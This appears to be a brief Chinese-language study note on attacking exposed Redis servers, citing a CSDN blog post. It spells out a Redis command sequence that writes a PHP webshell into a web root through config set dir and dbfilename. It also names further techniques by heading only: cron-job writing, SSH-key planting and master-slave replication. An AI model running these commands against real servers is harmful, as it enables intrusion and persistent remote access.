- 参考：https://blog.csdn.net/sorryagain/article/details/122664130
- 写webshell
	- ```redis
	  info
	  config set dir /var/www/html
	  config set dbfilename ttt.php
	  keys *
	  dump xxx
	  set xxx aaa
	  save
	  ```
- 写计划任务
- 写ssh密钥
- 主从复制